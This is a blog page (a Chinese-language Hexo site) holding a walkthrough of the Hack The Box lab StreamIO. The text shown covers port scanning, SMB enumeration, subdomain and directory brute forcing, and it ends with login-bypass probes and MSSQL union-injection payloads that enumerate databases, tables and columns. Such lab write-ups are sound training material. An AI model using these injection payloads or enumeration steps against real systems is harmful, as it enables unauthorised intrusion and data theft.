@@ -1,0 +1,1871 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>我的技术与生活——域渗透靶机HTB StreamIO | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——域渗透靶机HTB StreamIO`
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="https://lmlsama.top/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.top/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.top/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://lmlsama.top/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"W","cover":"/images/default-cover.webp","path":"2026/03/13/W/"},{"title":"W1R3S 1.0.1 靶机","cover":"/images/default-cover.webp","path":"2026/03/13/W1R3S 1.0.1 靶机/"},{"title":"域渗透","cover":"/images/default-cover.webp","path":"2026/03/13/域渗透/"},{"title":"票据攻击","cover":"/images/default-cover.webp","path":"2026/03/19/票据攻击/"},{"title":"靶机精炼-思路为王（四）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（四）/"},{"title":"靶机精炼-思路为王（三）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（三）/"},{"title":"靶机精炼-思路为王（一）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（一）/"},{"title":"靶机精炼-思路为王（二）","cover":"/images/default-cover.webp","path":"2026/03/20/靶机精炼-思路为王（二）/"},{"title":"委派攻击","cover":"/images/default-cover.webp","path":"2026/03/20/委派攻击/"},{"title":"域渗透靶机HTB StreamIO","cover":"/images/default-cover.webp","path":"2026/03/26/域渗透靶机HTB-StreamIO/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">lmlsama</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">kong</span>
+          <span class="main-left--tag">kong</span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“井底之蛙，虽不曾见过大海”</p>
+        <p>“但知晓天之湛蓝”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a target="_blank" rel="noopener" href="https://github.com/LMLsama/LMLsama.github.io"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>3</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>2</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>1 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>10 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>1500天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">域渗透靶机HTB StreamIO</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            <a class="category-link" href="/categories/%E9%9D%B6%E6%9C%BA/">靶机</a>
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            <a class="tag-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a>
+          </div>
+          
+          <p class="article-info--date">日期：2026-03-26 21:20:40</p>
+        </div>
+        <img src="/images/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <h1 id="靶机精讲：HTB-StreamIO开局"><a href="#靶机精讲：HTB-StreamIO开局" class="headerlink" title="靶机精讲：HTB StreamIO开局"></a>靶机精讲：HTB StreamIO开局</h1><blockquote>
+<p><strong>日常渗透破解场景均有呈现，更有 waf 下手动 MSSQL 注入，而且竟然有对标 Bloodhound 的手工域渗透路径枚举，难得的剖析域渗透攻击路径的靶机</strong></p>
+<p><strong>参数模糊测试、伪协议文件包含、代码审计、掳掠备份数据库、纵向提权</strong></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324214740132.png" alt="image-20260323194853904"></p>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p><strong>openvpn 连接这台靶机</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324214802472.png" alt="image-20260323195032724"></p>
+<p>**kali 地址 **<code>10.10.16.16</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324214803840.png" alt="image-20260323195206192"></p>
+<p>**靶机地址 **<code>10.129.64.95</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324214806084.png" alt="image-20260323195356890"></p>
+<h2 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h2><h3 id="TCP-端口扫描"><a href="#TCP-端口扫描" class="headerlink" title="TCP 端口扫描"></a>TCP 端口扫描</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324214808008.png" alt="image-20260323195332160"></p>
+<p><strong>格式化输出的数据</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324214809945.png" alt="image-20260323195641388"></p>
+<blockquote>
+<p><strong>53：DNS 域名系统</strong></p>
+<p><strong>88：Kerberos 服务</strong></p>
+<p><strong>135：MS-RPC 远程过程调用</strong></p>
+<p><strong>139：NetBIOS SMB（旧版 SMB）  445：SMB 文件服务</strong></p>
+<p><strong>389：LDAP 轻量级目录访问</strong></p>
+<p><strong>5985 端口是 Windows 远程管理（WinRM，Windows Remote Management）</strong></p>
+</blockquote>
+<h3 id="UDP-端口"><a href="#UDP-端口" class="headerlink" title="UDP 端口"></a>UDP 端口</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324220112425.png" alt="image-20260323200603627"></p>
+<h3 id="详细信息扫描"><a href="#详细信息扫描" class="headerlink" title="详细信息扫描"></a>详细信息扫描</h3><p>**指定端口时 **<code>-p$port</code> 然后按 tab 键可以自动补全</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215309397.png" alt="image-20260323200429042"></p>
+<p><strong>这里给我们查到了可能的域名 `streamIO.htb 和 watch.streamIO.htb</strong></p>
+<h3 id="漏洞脚本扫描"><a href="#漏洞脚本扫描" class="headerlink" title="漏洞脚本扫描"></a>漏洞脚本扫描</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215330213.png" alt="image-20260323202510178"></p>
+<p><strong>无可用漏洞</strong></p>
+<h3 id="优先级和路径"><a href="#优先级和路径" class="headerlink" title="优先级和路径"></a>优先级和路径</h3><p><strong>看 SMB 和 LDAP 等等端口是否有信息泄漏，然后看 web 渗透的状态和域服务交互</strong></p>
+<h2 id="设定域名解析（本地-hosts-文件）"><a href="#设定域名解析（本地-hosts-文件）" class="headerlink" title="设定域名解析（本地 hosts 文件）"></a>设定域名解析（本地 hosts 文件）</h2><p><strong>因为在服务器的运维实践中，经常会一个 IP 下运行多个网站，这是通过主机头进行设定的</strong></p>
+<p><strong>将我们刚才扫到的几个域名写在 kali 的 hosts 文件中</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215323589.png" alt="image-20260323201334259"></p>
+<h2 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h2><p><strong>这里的</strong><code>watch</code> 子域名在架设网站中不常见，那会不会还有其他子域名我们没扫出来？</p>
+<p><strong>这个思路很重要，有必要对子域名进行爆破</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -u https://streamio.htb -H &quot;HOST: FUZZ.streamio.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 315</span><br><span class="line">wfuzz -u https://streamio.htb -H &quot;HOST: FUZZ.streamio.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 315 </span><br></pre></td></tr></table></figure>
+
+<p><strong>–hh 隐藏 payload 长度为 315（无效）的结果</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215315907.png" alt="image-20260323201934505"></p>
+<p><strong>这里没扫到，但思路是对的</strong></p>
+<h2 id="SMB-服务渗透–四个常用工具"><a href="#SMB-服务渗透–四个常用工具" class="headerlink" title="SMB 服务渗透–四个常用工具"></a>SMB 服务渗透–四个常用工具</h2><h3 id="smbmap"><a href="#smbmap" class="headerlink" title="smbmap"></a>smbmap</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 靶机IP</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>smbmap</code> 是 SMB 共享枚举工具，<code>-H</code> 指定目标 IP，核心作用是快速探测目标主机开启的 SMB 共享、共享权限、可访问用户等基础信息。</p>
+<p>**主要是探测&#x2F;映射和扫描的作用 **</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215340852.png" alt="image-20260323202801646"></p>
+<p><strong>检测到一个 SMB 服务，但没有建立连接</strong></p>
+<h3 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //靶机IP -N</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>smbclient</code> 是 SMB 客户端工具，<code>-L</code> 列出目标主机的 SMB 共享列表，<code>-N</code> 表示 “无密码认证”（<strong>匿名访问</strong>）。</p>
+<p><strong>主要是和 SMB 服务进行交互访问的</strong></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215344379.png" alt="image-20260323202811407"></p>
+<p><strong>连接不允许</strong></p>
+<h3 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 靶机IP</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>crackmapexec</code>（CME）是渗透测试核心工具，<code>smb</code> 模块用于批量探测 SMB 服务的系统信息、权限、漏洞等，无需凭证即可获取基础指纹信息。</p>
+<p><strong>综合性，这里只用到了探测。在动态目录的评估上不可或缺，靠山吃山，利用的是 window 内置协议，有一定免杀效果</strong></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215347729.png" alt="image-20260323202821249"></p>
+<p><strong>除了最后一行都是初始化类输出（无需关注）：</strong><code>Creating home directory structure</code>&#x2F;<code>Initializing SMB protocol database</code> 等是 CME 首次运行的初始化操作，无实际攻击意义；</p>
+<p><strong>最后一行</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>字段</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>10.129.64.95:445</code></td>
+<td><strong>目标 IP 和 SMB 协议端口（445 是 SMB 默认端口）</strong></td>
+</tr>
+<tr>
+<td><code>DC</code></td>
+<td><strong>目标****主机角色</strong>为<strong>域控制器</strong>（Domain Controller，核心！域渗透的核心目标）</td>
+</tr>
+<tr>
+<td><code>Windows 10.0 Build 17763 x64</code></td>
+<td><strong>系统版本：Windows Server 2019（Build 17763 对应 Server 2019&#x2F;Win10 1809），64 位</strong></td>
+</tr>
+<tr>
+<td><code>name:DC</code></td>
+<td><strong>主机名</strong>是 DC</td>
+</tr>
+<tr>
+<td><code>domain:streamIO.htb</code></td>
+<td><strong>所属域名为 streamIO.htb（后续域渗透的核心域名）</strong></td>
+</tr>
+<tr>
+<td><code>signing:True</code></td>
+<td><strong>SMB 签名已开启（无法使用 SMB 中继攻击，需注意）</strong></td>
+</tr>
+<tr>
+<td><code>SMBv1:False</code></td>
+<td><strong>禁用了 SMBv1 协议（无永恒之蓝 &#x2F; MS17-010 漏洞利用可能）</strong></td>
+</tr>
+</tbody></table>
+<p><strong>它自带数据库，存储探测结果</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215349831.png" alt="image-20260323204916972"></p>
+<h3 id="补充本地-hosts-文件"><a href="#补充本地-hosts-文件" class="headerlink" title="补充本地 hosts 文件"></a>补充本地 hosts 文件</h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215353207.png" alt="QQ_1774269509254"></p>
+<h3 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enum4linux 靶机IP</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>enum4linux 是集成了 smbclient、rpcclient 等工具的自动化枚举脚本，专门用于探测 Windows &#x2F; 域环境的用户、组、共享、域信息等，核心目的是从目标获取基础的域 &#x2F; 系统 &#x2F; 用户信息，为后续攻击铺路</strong></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215401623.png" alt="image-20260323204414717"></p>
+<h2 id="80-端口-web-渗透"><a href="#80-端口-web-渗透" class="headerlink" title="80 端口 web 渗透"></a>80 端口 web 渗透</h2><p><strong>80 端口，watch.streamio.htb，streamio.htb 都是这个默认页面</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215453455.png" alt="image-20260323204951023"></p>
+<p><strong>源码没有任何东西</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215509022.png" alt="image-20260323205013152"></p>
+<p><strong>可以爆破一下，但其实没有东西</strong></p>
+<h2 id="443-端口-web-渗透"><a href="#443-端口-web-渗透" class="headerlink" title="443 端口 web 渗透"></a>443 端口 web 渗透</h2><h3 id="先看-streamio-htb"><a href="#先看-streamio-htb" class="headerlink" title="先看 streamio.htb"></a>先看 <code>streamio.htb</code></h3><p><strong>用 IP 地址访问，没有任何信息</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215457717.png" alt="image-20260323205424737"></p>
+<p>**用域名访问 **<a target="_blank" rel="noopener" href="https://stramio.htb/">https://stramio.htb</a> 是有内容的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215459318.png" alt="image-20260323205444953"></p>
+<p><strong>about 页面</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215538527.png" alt="image-20260323205639672"></p>
+<p><strong>contact us 页面</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215541682.png" alt="image-20260323205715202"></p>
+<p><strong>而且可以提交，但不知道 xss 有没有用，如果是存储型，后面要找到存储信息的页面</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215550552.png" alt="image-20260323205844474"></p>
+<p><strong>支持的技术，看一下有个印象</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215559472.png" alt="image-20260323210008439"></p>
+<p><strong>IIS 服务器配置成支持 ASP 的 web 服务，是不是也支持 ASPX 的利用…</strong></p>
+<p><strong>登录界面，判断有没有注入点</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215556840.png" alt="image-20260323210500201"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1=1 -- -</span><br><span class="line">&#x27; and 1=1 -- -</span><br></pre></td></tr></table></figure>
+
+<p><strong>失败后，看到下面一个 register 注册（这里就算注册成功了，依然不让登录）</strong></p>
+<h3 id="再看-watch-streamio-htb"><a href="#再看-watch-streamio-htb" class="headerlink" title="再看 watch.streamio.htb"></a>再看 <code>watch.streamio.htb</code></h3><p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215602275.png" alt="image-20260323210927770"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215604204.png" alt="image-20260323211024639"></p>
+<p><strong>这里让你留下邮箱好订阅服务</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215627303.png" alt="image-20260323211140362"></p>
+<p><strong>这里只能填邮箱，否则会报错提示</strong></p>
+<h3 id="目录爆破（交叉验证！）"><a href="#目录爆破（交叉验证！）" class="headerlink" title="目录爆破（交叉验证！）"></a>目录爆破（交叉验证！）</h3><p><strong>不同扫描工具，他们算法不一样，可能会有不同的发现</strong></p>
+<h4 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a><code>gobuster</code></h4><p><strong>这里可以目录爆破一下，有证书问题就用参数 -k（因为是 https 的扫描）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u https://streamio.htb --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215624557.png" alt="image-20260323211501041"></p>
+<p><strong>访问</strong><code>admin</code> 目录，forbidden，说明有这个目录</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215631316.png" alt="image-20260323211616674"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215622431.png" alt="image-20260323212032369"></p>
+<h4 id="feroxbuster"><a href="#feroxbuster" class="headerlink" title="feroxbuster"></a><code>feroxbuster</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">feroxbuster -u https://streamio.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -k</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>feroxbuster</code> 是一款用 <strong>Rust 语言开发</strong>的开源 Web 目录 &#x2F; 文件爆破工具，核心作用是：通过指定字典遍历目标 Web 服务器的隐藏目录、文件、子域名，挖掘潜在的敏感页面（如后台登录、配置文件、备份文件）或漏洞入口，是 Web 渗透测试中信息收集阶段的核心工具之一。</p>
+<table>
+<thead>
+<tr>
+<th><strong>优势</strong></th>
+<th><strong>具体说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>速度极快</strong></td>
+<td><strong>Rust 语言的高性能特性，支持多线程 &#x2F; 异步请求，爆破速度远超 Python 开发的 gobuster</strong></td>
+</tr>
+<tr>
+<td><strong>功能全面</strong></td>
+<td><strong>支持目录枚举、文件枚举、子域名枚举、递归扫描，还能指定文件扩展名、过滤响应</strong></td>
+</tr>
+<tr>
+<td><strong>兼容性好</strong></td>
+<td><strong>完美支持 HTTPS（自带</strong><code>-k</code> 跳过证书验证）、HTTP 代理、Cookie&#x2F;Header 自定义</td>
+</tr>
+<tr>
+<td><strong>输出友好</strong></td>
+<td><strong>支持彩色输出、JSON&#x2F;CSV 导出，便于快速筛选有效结果（如只显示 200&#x2F;301 响应）</strong></td>
+</tr>
+<tr>
+<td><strong>轻量无依赖</strong></td>
+<td><strong>编译后是单二进制文件，无需安装 Python&#x2F;Perl 等运行环境，直接运行</strong></td>
+</tr>
+</tbody></table>
+</blockquote>
+<blockquote>
+<p><code>-x php</code>：指定要枚举的文件扩展名（仅探测 <code>.php</code> 后缀的文件，聚焦 Web 应用的 PHP 脚本）</p>
+<p><code>-k</code>：跳过 SSL 证书验证（解决自签名证书导致的 HTTPS 访问失败问题）；</p>
+</blockquote>
+<p><strong>对</strong><code>streamio.htb</code> 的扫描</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215619269.png" alt="image-20260323212310769"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215616967.png" alt="image-20260323212218925"></p>
+<p><strong>这里扫出来许多 gobuster 没扫出来的东西，如 index.php  master.php…</strong></p>
+<p><strong>对</strong><code>watch.streamio.htb</code> 的扫描</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215613985.png" alt="image-20260323213055458"></p>
+<p><code>streamio.htb/admin/master.php</code> 仅能通过包含的方式访问</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215611098.png" alt="image-20260323213611595"></p>
+<p><code>watch.streamio.htb/search.php</code> 电影搜索页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215636460.png" alt="image-20260323213658593"></p>
+<p><code>watch.streamio.htb/blocked.php</code> 恶意活动被阻止，会话禁用 5 分钟。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215650645.png" alt="image-20260323213913217"></p>
+<p><strong>可能是纯文本，也可能我们爆破，有 waf 检测…</strong></p>
+<h2 id="MSSQL（即-SQL-server）注入"><a href="#MSSQL（即-SQL-server）注入" class="headerlink" title="MSSQL（即 SQL server）注入"></a>MSSQL（即 SQL server）注入</h2><blockquote>
+<p><strong>获取数据库信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-- 当前数据库</span><br><span class="line">&#x27; union select db_name()--</span><br><span class="line"></span><br><span class="line">-- 所有数据库</span><br><span class="line">&#x27; union select name from master..sysdatabases--</span><br><span class="line"></span><br><span class="line">-- 当前表</span><br><span class="line">&#x27; union select table_name from information_schema.tables--</span><br><span class="line"></span><br><span class="line">-- 当前列</span><br><span class="line">&#x27; union select column_name from information_schema.columns where table_name=&#x27;users&#x27;--</span><br></pre></td></tr></table></figure></blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images20260324215653301.png" alt="image-20260323213658593"></p>
